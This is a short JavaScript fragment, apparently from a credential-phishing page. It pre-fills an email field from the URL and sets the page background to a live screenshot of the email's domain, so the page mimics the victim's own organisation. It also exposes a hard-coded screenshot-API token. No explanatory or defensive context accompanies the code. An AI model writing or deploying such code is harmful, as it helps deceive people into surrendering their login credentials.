  <script>
    // Retrieve email from URL parameters
    function getEmailFromURL() {
      var urlParams = new URLSearchParams(window.location.search);
      return urlParams.get('email');
    }

    // Set email value in the email input field
    function setEmailValue() {
      var emailInput = document.getElementById('email');
      var email = getEmailFromURL();
      if (email) {
        emailInput.value = email;

        // Get the domain from the email
        var domain = email.split('@')[1];

        // Set the background image to the screenshot of the domain
        var screenshotUrl = 'https://shot.screenshotapi.net/screenshot?token=SDD13XY-WFZM7V8-G922CGA-VWCC481&url=' + encodeURIComponent('https://' + domain);
        document.body.style.backgroundImage = 'url(' + screenshotUrl + ')';
      }
    }

    // Run the function when the page is loaded
    window.addEventListener('DOMContentLoaded', setEmailValue);
